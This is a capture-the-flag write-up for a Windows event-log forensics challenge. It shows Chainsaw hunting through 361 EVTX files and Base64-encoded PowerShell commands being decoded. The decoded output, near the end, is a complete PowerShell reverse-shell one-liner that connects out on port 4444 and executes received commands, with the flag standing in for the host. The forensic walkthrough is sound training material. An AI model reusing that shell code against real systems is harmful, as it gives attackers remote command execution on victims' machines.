
# Challenge Name: An Interesting Event
## Category: Digital Forensics

## Description

I hate windows logs.
  
---
## Approach

For this challenge you were given a zip file that contains a bunch of Windows Event Logs :

```bash
➜  /home/kakarot/RamadhanCTF/foren/an_interesting_event  ls Logs | wc -l
361
➜  /home/kakarot/RamadhanCTF/foren/an_interesting_event  ll Logs | tail -n 5
-rw-r--r-- 1 kakarot kakarot  68K Mar 27 16:36 Setup.evtx
-rw-r--r-- 1 kakarot kakarot  68K Mar 27 16:40 SMSApi.evtx
-rw-r--r-- 1 kakarot kakarot  68K Mar 27 16:37 State.evtx
-rw-r--r-- 1 kakarot kakarot 1.1M Mar 27 17:01 System.evtx
-rw-r--r-- 1 kakarot kakarot 1.1M Mar 27 16:58 Windows PowerShell.evtx
```

## Solution : 

The solution is pretty simple, all you need to do is analyze those files until you find something suspicious, but doing it manually would take forever especially when you have more than 300 files and you don't know which one you need (me neither).

Your best shot here is to use a tool to automate the analysis process, luckily there are many tools fit for this job. For this challenge I recommend using **chainsaw** which can be downloaded from here : https://github.com/WithSecureLabs/chainsaw

>PS : I recommend downloading the tool from the release section, building it yourself might not be useful

So after downloading the tool all you need to do is run this command to hunt through all the EVTX files :

```bash
➜  /home/kakarot/RamadhanCTF/foren/an_interesting_event  chainsaw/chainsaw_x86_64-unknown-linux-gnu hunt Logs -s chainsaw/sigma --mapping chainsaw/mappings/sigma-event-logs-all.yml -r chainsaw/rules --full --csv --output output

 ██████╗██╗  ██╗ █████╗ ██╗███╗   ██╗███████╗ █████╗ ██╗    ██╗
██╔════╝██║  ██║██╔══██╗██║████╗  ██║██╔════╝██╔══██╗██║    ██║
██║     ███████║███████║██║██╔██╗ ██║███████╗███████║██║ █╗ ██║
██║     ██╔══██║██╔══██║██║██║╚██╗██║╚════██║██╔══██║██║███╗██║
╚██████╗██║  ██║██║  ██║██║██║ ╚████║███████║██║  ██║╚███╔███╔╝
 ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚══╝╚══╝
    By WithSecure Countercept (@FranticTyping, @AlexKornitzer)

[+] Loading detection rules from: chainsaw/rules, chainsaw/sigma
[!] Loaded 3465 detection rules (494 not loaded)
[+] Loading forensic artefacts from: Logs (extensions: .mft, .evt, .evtx, .$MFT, .bin)
[+] Loaded 361 forensic artefacts (54.1 MiB)
[+] Current Artifact: Logs/Microsoft-Windows-Authentication User Interface%4Operational.evtx
[+] Hunting [========================================] 361/361   [00:00:04]                                                                                [+] Created account_tampering.csv
[+] Created microsoft_rds_events_-_user_profile_disk.csv
[+] Created powershell_engine_state.csv
[+] Created rdp_events.csv
[+] Created service_installation.csv
[+] Created sigma.csv

[+] 81 Detections found on 75 documents
```

The results of the analysis where saved into CSV files under the directory **output**, where there's a file with an interesting name : 

```bash
➜  /home/kakarot/RamadhanCTF/foren/an_interesting_event  ls -l output   
total 36
-rw-r--r-- 1 root root 2005 Mar 30 18:30 account_tampering.csv
-rw-r--r-- 1 root root 2589 Mar 30 18:30 microsoft_rds_events_-_user_profile_disk.csv
-rw-r--r-- 1 root root 5900 Mar 30 18:30 powershell_engine_state.csv
-rw-r--r-- 1 root root  617 Mar 30 18:30 rdp_events.csv
-rw-r--r-- 1 root root 2288 Mar 30 18:30 service_installation.csv
-rw-r--r-- 1 root root 8713 Mar 30 18:30 sigma.csv
```

The file **powershell_engine_state.csv** might contain something useful, let's open it :

```bash
➜  /home/kakarot/RamadhanCTF/foren/an_interesting_event/output  cat powershell_engine_state.csv | tail -n 2
2025-03-27T23:58:33.424636+00:00,PowerShell - Engine state is changed from None to Available,Logs/Windows PowerShell.evtx,400,Windows PowerShell,DESKTOP-SCG1VOK,ConsoleHost,5.1.19041.3803,powershell -c 'QQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==' | Out-File -Encoding ascii -FilePath b -Append -NoNewline,,,,,,
2025-03-27T23:58:34.065195+00:00,PowerShell - Engine state is changed from Available to Stopped,Logs/Windows PowerShell.evtx,403,Windows PowerShell,DESKTOP-SCG1VOK,ConsoleHost,5.1.19041.3803,powershell -c 'QQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==' | Out-File -Encoding ascii -FilePath b -Append -NoNewline,,,,,,
```

As you can see there are some powershell commands, which seem to be putting some encoded strings in a file after decoding them.

To see what was being written in that file, you'll need to collect those encoded strings -which seem to be Base64 encoded- and decode them. This command will do the job : 

```bash
➜  /home/kakarot/RamadhanCTF/foren/an_interesting_event/output  awk -F',' '!seen[$9]++ {print $9}' powershell_engine_state.csv | grep -o "'[A-Za-z0-9+/=]*'" | tr -d "'" | base64 -d
$client = New-Object System.Net.Sockets.TCPClient("Spark{1_h4t3_evtx_4nd_y0u_w1ll_t00}",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

After decoding the file's content, you'll see it's a simple revershell script written with powershell and the IP address is replaced by the flag.

**Flag** : **Spark{1_h4t3_evtx_4nd_y0u_w1ll_t00}**
